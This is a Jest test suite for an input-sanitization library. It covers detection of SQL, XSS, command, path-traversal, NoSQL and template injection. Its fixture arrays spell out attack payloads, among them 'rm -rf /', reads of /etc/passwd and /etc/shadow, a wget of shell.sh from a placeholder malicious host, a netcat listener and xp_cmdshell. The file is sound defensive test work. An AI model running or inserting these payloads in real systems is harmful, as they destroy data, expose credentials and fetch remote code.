/**
 * Security Validation Test Suite
 * 
 * Comprehensive tests for security validation, sanitization,
 * and injection attack prevention.
 * 
 * SECURITY TESTING:
 * - SQL injection attack patterns
 * - XSS payload validation
 * - Command injection detection
 * - Path traversal prevention
 * - Input sanitization
 * - API parameter validation
 */

import { describe, test, expect } from '@jest/globals';
import {
  detectMaliciousPatterns,
  sanitizeForSQL,
  sanitizeHTML,
  sanitizeForCommand,
  sanitizeFilePath,
  sanitizeEmail,
  sanitizeURL,
  sanitizeJSON,
  sanitizeQueryParam,
  sanitizeContent,
  sanitizeFileName,
  sanitizeSearchQuery,
  sanitizeAPIKey,
  sanitizeEnvVar
} from '../../lib/validation/sanitizers';

describe('Security Validation Test Suite', () => {
  
  describe('Malicious Pattern Detection', () => {
    test('should detect SQL injection patterns', () => {
      const sqlInjectionInputs = [
        "'; DROP TABLE users; --",
        "' OR 1=1 --",
        "' UNION SELECT * FROM passwords --",
        "admin'--",
        "' OR 'a'='a",
        "1; UPDATE users SET password='hacked' WHERE id=1",
        "'; EXEC xp_cmdshell('dir') --"
      ];
      
      sqlInjectionInputs.forEach(input => {
        const result = detectMaliciousPatterns(input);
        expect(result.detected).toBe(true);
        expect(result.threats).toContain('sqlInjection');
      });
    });
    
    test('should detect XSS patterns', () => {
      const xssInputs = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<svg onload="alert(1)">',
        'data:text/html,<script>alert(1)</script>',
        '<link rel="stylesheet" href="javascript:alert(1)">'
      ];
      
      xssInputs.forEach(input => {
        const result = detectMaliciousPatterns(input);
        expect(result.detected).toBe(true);
        expect(result.threats).toContain('xss');
      });
    });
    
    test('should detect command injection patterns', () => {
      const commandInjectionInputs = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '&& wget malicious.com/shell.sh',
        '`cat /etc/shadow`',
        '$(rm important.txt)',
        '; ping -c 10 google.com',
        '| nc -l 4444'
      ];
      
      commandInjectionInputs.forEach(input => {
        const result = detectMaliciousPatterns(input);
        expect(result.detected).toBe(true);
        expect(result.threats).toContain('commandInjection');
      });
    });
    
    test('should detect path traversal patterns', () => {
      const pathTraversalInputs = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32\\config\\sam',
        '....//....//etc//passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%2f..%2f..%2fetc%2fpasswd'
      ];
      
      pathTraversalInputs.forEach(input => {
        const result = detectMaliciousPatterns(input);
        expect(result.detected).toBe(true);
        expect(result.threats).toContain('pathTraversal');
      });
    });
    
    test('should allow safe inputs', () => {
      const safeInputs = [
        'normal text',
        'user@example.com',
        'AAPL',
        '10-K',
        'https://example.com',
        'filename.pdf',
        'SELECT * FROM users WHERE id = ?'  // Parameterized query
      ];
      
      safeInputs.forEach(input => {
        const result = detectMaliciousPatterns(input);
        expect(result.detected).toBe(false);
        expect(result.threats).toHaveLength(0);
      });
    });
  });
  
  describe('SQL Sanitization', () => {
    test('should sanitize SQL injection attempts', () => {
      expect(sanitizeForSQL("'; DROP TABLE users; --")).toBe("''; DROP TABLE users ");
      expect(sanitizeForSQL("admin'--")).toBe("admin''");
      expect(sanitizeForSQL("' OR 1=1 --")).toBe("'' OR 1=1 ");
    });
    
    test('should preserve safe SQL content', () => {
      expect(sanitizeForSQL("normal text")).toBe("normal text");
      expect(sanitizeForSQL("user@example.com")).toBe("user@example.com");
    });
    
    test('should throw on remaining malicious patterns', () => {
      expect(() => sanitizeForSQL("' OR '1'='1")).toThrow('SQL injection patterns');
    });
  });
  
  describe('HTML Sanitization', () => {
    test('should remove dangerous HTML tags', () => {
      expect(sanitizeHTML('<script>alert("XSS")</script>')).toBe('');
      expect(sanitizeHTML('<img src="x" onerror="alert(1)">')).toBe('');
      expect(sanitizeHTML('<iframe src="malicious"></iframe>')).toBe('');
    });
    
    test('should preserve safe HTML tags', () => {
      expect(sanitizeHTML('<b>bold text</b>')).toBe('<b>bold text</b>');
      expect(sanitizeHTML('<p>paragraph</p>')).toBe('<p>paragraph</p>');
      expect(sanitizeHTML('<em>emphasis</em>')).toBe('<em>emphasis</em>');
    });
  });
  
  describe('Command Injection Sanitization', () => {
    test('should remove command injection characters', () => {
      expect(sanitizeForCommand('file.txt; rm -rf /')).toBe('file.txt rm -rf /');
      expect(sanitizeForCommand('data | cat /etc/passwd')).toBe('data  cat /etc/passwd');
      expect(sanitizeForCommand('test && wget malicious')).toBe('test  wget malicious');
    });
    
    test('should throw on remaining dangerous patterns', () => {
      expect(() => sanitizeForCommand('rm important.txt')).toThrow('command injection patterns');
    });
  });
  
  describe('Path Traversal Sanitization', () => {
    test('should remove path traversal sequences', () => {
      expect(sanitizeFilePath('../../../etc/passwd')).toBe('etc/passwd');
      expect(sanitizeFilePath('..\\..\\windows\\system')).toBe('windows\\system');
      expect(sanitizeFilePath('normal/path/file.txt')).toBe('normal/path/file.txt');
    });
    
    test('should remove dangerous file system characters', () => {
      expect(sanitizeFilePath('file<name>.txt')).toBe('filename.txt');
      expect(sanitizeFilePath('file|name.txt')).toBe('filename.txt');
    });
  });
  
  describe('Email Sanitization', () => {
    test('should validate and sanitize email addresses', () => {
      expect(sanitizeEmail('user@EXAMPLE.COM')).toBe('user@example.com');
      expect(sanitizeEmail('  test@domain.org  ')).toBe('test@domain.org');
    });
    
    test('should throw on invalid email formats', () => {
      expect(() => sanitizeEmail('invalid-email')).toThrow('Invalid email format');
      expect(() => sanitizeEmail('user@')).toThrow('Invalid email format');
      expect(() => sanitizeEmail('@domain.com')).toThrow('Invalid email format');
    });
  });
  
  describe('URL Sanitization', () => {
    test('should validate and sanitize URLs', () => {
      expect(sanitizeURL('https://example.com/path')).toBe('https://example.com/path');
      expect(sanitizeURL('http://test.org:8080')).toBe('http://test.org:8080/');
    });
    
    test('should reject dangerous protocols', () => {
      expect(() => sanitizeURL('javascript:alert(1)')).toThrow('Only HTTP and HTTPS URLs are allowed');
      expect(() => sanitizeURL('data:text/html,<script>')).toThrow('Only HTTP and HTTPS URLs are allowed');
      expect(() => sanitizeURL('ftp://example.com')).toThrow('Only HTTP and HTTPS URLs are allowed');
    });
  });
  
  describe('JSON Sanitization', () => {
    test('should sanitize nested JSON objects', () => {
      const input = {
        name: '<script>alert(1)</script>',
        data: {
          value: "'; DROP TABLE users; --",
          array: ['normal', '<img onerror="alert(1)">']
        }
      };
      
      const result = sanitizeJSON(input) as any;
      expect(result.name).toBe('');
      expect(result.data.value).toBe("''; DROP TABLE users ");
      expect(result.data.array[0]).toBe('normal');
      expect(result.data.array[1]).toBe('');
    });
  });
  
  describe('Query Parameter Sanitization', () => {
    test('should sanitize different parameter types', () => {
      expect(sanitizeQueryParam('normal string')).toBe('normal string');
      expect(sanitizeQueryParam(123)).toBe(123);
      expect(sanitizeQueryParam(true)).toBe(true);
      expect(sanitizeQueryParam(null)).toBe(null);
    });
    
    test('should throw on invalid parameter types', () => {
      expect(() => sanitizeQueryParam({})).toThrow('Invalid parameter type');
      expect(() => sanitizeQueryParam([])).toThrow('Invalid parameter type');
      expect(() => sanitizeQueryParam(NaN)).toThrow('Invalid numeric parameter');
    });
    
    test('should throw on malicious string patterns', () => {
      expect(() => sanitizeQueryParam("'; DROP TABLE users; --")).toThrow('SQL injection patterns');
    });
  });
  
  describe('Content Sanitization', () => {
    test('should sanitize large content while preserving formatting', () => {
      const input = '<p>Normal content</p><script>alert(1)</script><b>Bold text</b>';
      const result = sanitizeContent(input);
      expect(result).toContain('<p>Normal content</p>');
      expect(result).toContain('<b>Bold text</b>');
      expect(result).not.toContain('<script>');
    });
    
    test('should truncate content that is too long', () => {
      const longContent = 'a'.repeat(60000);
      const result = sanitizeContent(longContent, 1000);
      expect(result.length).toBe(1000);
    });
  });
  
  describe('File Name Sanitization', () => {
    test('should sanitize dangerous file names', () => {
      expect(sanitizeFileName('../../../etc/passwd')).toBe('etc/passwd');
      expect(sanitizeFileName('file<name>.txt')).toBe('filename.txt');
      expect(sanitizeFileName('file|name.txt')).toBe('filename.txt');
    });
    
    test('should handle reserved Windows names', () => {
      expect(sanitizeFileName('CON')).toBe('_CON');
      expect(sanitizeFileName('PRN')).toBe('_PRN');
      expect(sanitizeFileName('AUX')).toBe('_AUX');
    });
    
    test('should throw on invalid file names', () => {
      expect(() => sanitizeFileName('')).toThrow('Invalid file name');
      expect(() => sanitizeFileName('...')).toThrow('Invalid file name');
    });
  });
  
  describe('Search Query Sanitization', () => {
    test('should sanitize search queries', () => {
      expect(sanitizeSearchQuery('normal search')).toBe('normal search');
      expect(sanitizeSearchQuery('search "term"')).toBe('search term');
    });
    
    test('should remove dangerous search operators', () => {
      expect(sanitizeSearchQuery('term AND 1=1')).toBe('term');
      expect(sanitizeSearchQuery('search (malicious)')).toBe('search malicious');
    });
    
    test('should limit search query length', () => {
      const longQuery = 'search '.repeat(100);
      const result = sanitizeSearchQuery(longQuery);
      expect(result.length).toBeLessThanOrEqual(500);
    });
  });
  
  describe('API Key Sanitization', () => {
    test('should validate API key format', () => {
      expect(sanitizeAPIKey('sk-1234567890abcdef')).toBe('sk-1234567890abcdef');
      expect(sanitizeAPIKey('api_key_12345')).toBe('api_key_12345');
    });
    
    test('should throw on invalid API keys', () => {
      expect(() => sanitizeAPIKey('short')).toThrow('API key length is invalid');
      expect(() => sanitizeAPIKey('key with spaces')).toThrow('API key contains invalid characters');
      expect(() => sanitizeAPIKey('key<script>')).toThrow('API key contains invalid characters');
    });
  });
  
  describe('Environment Variable Sanitization', () => {
    test('should sanitize environment variable names and values', () => {
      const result = sanitizeEnvVar('database_url', 'postgresql://user:pass@host:5432/db');
      expect(result.name).toBe('DATABASE_URL');
      expect(result.value).toBe('postgresql://user:pass@host:5432/db');
    });
    
    test('should throw on invalid environment variable names', () => {
      expect(() => sanitizeEnvVar('123_INVALID', 'value')).toThrow('Invalid environment variable name format');
      expect(() => sanitizeEnvVar('invalid-name', 'value')).toThrow('Invalid environment variable name format');
    });
    
    test('should limit environment variable value length', () => {
      const longValue = 'a'.repeat(40000);
      expect(() => sanitizeEnvVar('TEST_VAR', longValue)).toThrow('Environment variable value too long');
    });
  });
  
  describe('Integration Security Tests', () => {
    test('should handle complex attack payloads', () => {
      const complexAttack = `
        <script>
          fetch('/api/admin', {
            method: 'POST',
            body: JSON.stringify({
              command: "'; DROP TABLE users; rm -rf / --"
            })
          });
        </script>
      `;
      
      const result = detectMaliciousPatterns(complexAttack);
      expect(result.detected).toBe(true);
      expect(result.threats).toContain('xss');
      expect(result.threats).toContain('sqlInjection');
      expect(result.threats).toContain('commandInjection');
    });
    
    test('should handle Unicode and encoding attacks', () => {
      const unicodeAttacks = [
        '\u003cscript\u003ealert(1)\u003c/script\u003e', // Unicode encoded script
        '%3Cscript%3Ealert(1)%3C/script%3E', // URL encoded script
        '&#60;script&#62;alert(1)&#60;/script&#62;' // HTML entity encoded
      ];
      
      unicodeAttacks.forEach(attack => {
        const sanitized = sanitizeHTML(attack);
        expect(sanitized).not.toContain('script');
        expect(sanitized).not.toContain('alert');
      });
    });
    
    test('should prevent NoSQL injection patterns', () => {
      const nosqlAttacks = [
        '{"$where": "this.password.match(/.*/)"}',
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"$or": [{"password": {"$regex": ".*"}}]}'
      ];
      
      nosqlAttacks.forEach(attack => {
        const result = detectMaliciousPatterns(attack);
        expect(result.detected).toBe(true);
        expect(result.threats).toContain('nosqlInjection');
      });
    });
    
    test('should prevent template injection', () => {
      const templateAttacks = [
        '{{constructor.constructor("return process")().env}}',
        '${7*7}',
        '#{7*7}',
        '%{7*7}',
        '<%= 7*7 %>'
      ];
      
      templateAttacks.forEach(attack => {
        const result = detectMaliciousPatterns(attack);
        expect(result.detected).toBe(true);
        expect(result.threats).toContain('templateInjection');
      });
    });
  });
});